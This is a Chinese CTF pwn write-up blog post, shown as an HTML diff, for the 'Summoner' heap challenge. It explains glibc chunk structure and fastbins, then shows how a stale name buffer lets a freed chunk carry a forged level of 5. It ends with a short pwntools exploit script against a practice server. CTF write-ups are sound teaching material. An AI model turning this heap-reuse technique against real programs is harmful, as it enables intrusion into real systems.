@@ -1,0 +1,101 @@
+<!DOCTYPE html><html lang="cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>堆溢出 | -NIYAH-</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="-NIYAH-" type="application/atom+xml">
+</head><body><header><nav><a href="/">Home</a><a href="/about/">About</a><a href="/friends/">Friends</a><a href="/archives/">Archives</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2021-02-26T06:10:27.000Z" id="date"> 2021-02-26</time></span><br><span>updated:<time datetime="2021-02-26T15:52:16.707Z" id="updated"> 2021-02-26</time></span></div><h1>堆溢出</h1><hr></div><div id="post-content"><h2 id="summoner"><a class="markdownIt-Anchor" href="#summoner">#</a> Summoner</h2>
+<h3 id="热知识"><a class="markdownIt-Anchor" href="#热知识">#</a> 热知识</h3>
+<blockquote>
+<p>​	在做这道题目之前，我们首先需要了解一些堆的基本概念，堆不同于栈，栈在程序运行时会自己出现，堆是动态分配的 (由操作系统内核或者堆管理器)，只有在程序中需要时才会分配。在 CTF 的 pwn 中，栈是程序加载进内存后就会出现，而堆是由<kbd>malloc</kbd>、<kbd>alloc</kbd>、<kbd>realloc </kbd>函数分配内存后才会出现。</p>
+</blockquote>
+<p>​	以 64 位程序为例子，在用户申请堆块后，系统便会给用户划分一块内存 (chunk) 供用户使用，这块内存通常如下图所示，这是用户在使用中的情况。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">如下</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">pre size</td>
+<td style="text-align:center">size</td>
+</tr>
+<tr>
+<td style="text-align:center">用户数据</td>
+<td style="text-align:center">用户数据</td>
+</tr>
+</tbody>
+</table>
+<p>​	可以看到 chunk 的大小并不等于用户申请的大小，而是比用户申请的大 0x10 个字节，这多出来的部分通产用来存放 chunk 的信息。</p>
+<blockquote>
+<p>size 位 ：这里存放的是当前 chunk 的大小 (包括 chunk 头)，而我们知道，64 位程序通常以 8 字节对齐，在一般情况下，chunk 的大小都是 0x8 的整数倍，而 1 字节由八个 bit 组成，以 0x8 为最小单位则低三位恒为零，所以这三位存放的是 chunk 的状态。</p>
+<blockquote>
+<p>0 0 0 0 1 0 0 0    =   0x8</p>
+</blockquote>
+<p>目前我们只需要要知道最低位 PREV_INUSE ，它记录前一个 (物理距离) chunk 是否被使用。</p>
+<p>pre size 位 ：这个位置比较灵活，在 PREV_INUSE 为 1 时，可以被上一个块使用，在 PREV_INUSE 为 0 时，记录上一个块的大小。</p>
+</blockquote>
+<p>​	所以当我们执行 malloc (0x10) 时，得到的大小通常是 0x21。</p>
+<p>​	<kbd>malloc</kbd>函数返回的是一个指向用户数据段的一个指针，我们可以通过<kbd>free</kbd>函数释放这个指针，在我们执行 free 操作释放指针后，chunk 会发生一些改变并根据一定的规则放入 bin 中，其中便有 fast bin、unsorted bin、small bin、large bin，fast bin 为单向链表，其他的都是双向链表，0x21 大小的 chunk 被释放后如下</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">如下</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">pre size</td>
+<td style="text-align:center">size</td>
+</tr>
+<tr>
+<td style="text-align:center">fd</td>
+<td style="text-align:center">用户数据</td>
+</tr>
+</tbody>
+</table>
+<p>​	一般小于等于 0x70 大小的 chunk 被 free 掉之后会被放入相应大小的 fast bin 中，当用户再次申请相应大小的块时，系统会在 fast bin 中把那个块从链表末尾捡回来，既然是单向链表，则新增加的 fd 位自然是指向上个 chunk 的 pre size 地址</p>
+<h3 id="开始做题"><a class="markdownIt-Anchor" href="#开始做题">#</a> 开始做题</h3>
+<p>​	拿到题目进行分析，发现保护全开，这在堆题目里其实是很常见的</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-1.png"></center>
+<p>​	先不慌我们先运行一下</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-2.png"></center>
+<p>​	根据题目描述大概是，让我们想办法召唤一只 level5 的怪兽和对面召唤的 level5 的怪兽撞过去</p>
+<blockquote>
+<p>​	题目提供了几种命令：</p>
+<ul>
+<li>展示召唤物信息</li>
+<li>召唤一只生物，并给它起名字</li>
+<li>设置生物的等级，但必须小于 5</li>
+<li>攻击敌方召唤物</li>
+<li>释放召唤物</li>
+</ul>
+</blockquote>
+<p>​	在 IDA 分析过后可以发现还是有点问题的，首先是<kbd>strdup</kbd>函数，其返回一个指针，指向为复制字符串分配的空间，这个空间的大小是由我们决定的，其次是释放命令，它在使用后仅仅是把指针清空，并没有将我们用户的数据进行清空</p>
+<p>​	接下来我们构造脚本进行攻击，我们在进行召唤一个怪兽和升四级之后，他们的堆块变成了这个样子</p>
+<blockquote>
+<p>summor aaa</p>
+<p>level-up 4</p>
+</blockquote>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-3.png"></center>
+<p>​	我们可以看见 2 号箭头指向的 616161 就是怪兽的名字 aaa，1 号箭头指向的为怪兽等级 4，3 号箭头指向了怪兽名字的地址，在这个时候，我们也就对这个召唤物的成分有了一些认识</p>
+<p>​	首先，在进行召唤过后，系统会自动 malloc 一个 chunk，其大小为 0x10，他的前 0x8 字节存放怪兽名字的地址，后 0x8 字节存放怪兽的等级，之后解放掉这只怪兽</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-4.png"></center>
+<p>​	存放解放怪兽姓名的 chunk 会被 free 掉进入 bin 中</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-5.png"></center>
+<p>​	当我们再次召唤时，便会将以收入 bin 中的 0x20 大小的块捡回来使用，而最开始输入的姓名不限长度，用户数据又不会清空，那么我们大可以把前一个 0x8 字节填满，溢出到下一个 0x8 字节，所以我们只需在最初召唤时溢出一个字节来存放等级，解放掉，再次申请回来时，那个块的前 0x8 个字节依然存放姓名指针，而后 0x8 个字节便是我们残留的等级</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-6.png"></center>
+<p>​	再次召唤后进行攻击就能 getshell 了</p>
+<center><img src="/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-7.png"></center>
+<p>​	脚本十分简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p =process(&quot;./summoner&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25153</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params"> name </span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;summon &quot;</span>+ name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;show&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span>(<span class="params"> l </span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;level-up &quot;</span> + <span class="built_in">str</span>(l))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;release&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;aaaaaaaa&quot;</span> + p64(<span class="number">5</span>))</span><br><span class="line">delete()</span><br><span class="line">new(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><hr><a href="/CTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div><script>new Valine({
+ el: '#Valine'
+ , appId: 'BxfwtJSIufSEhHcYRNUxBFjJ-gzGzoHsz'
+ , appKey: '51wd7rcwQdYtBJ9oRHucwGYm'
+ , placeholder: '此条评论委托企鹅物流发送'
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Niyah</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">4</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">6</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">1</span></div></section></div><div id="aside-block"><h1>INDEX</h1><div id="post-index"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#summoner"><span class="toc-number">1.</span> <span class="toc-text"> Summoner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 热知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 开始做题</span></a></li></ol></li></ol></div></div><footer><nobr><span class="text-title">©</span><span class="text-content">2020 to 2021</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——暂时没有——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html><div class="aplayer" data-id="5474434735" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js"></script>
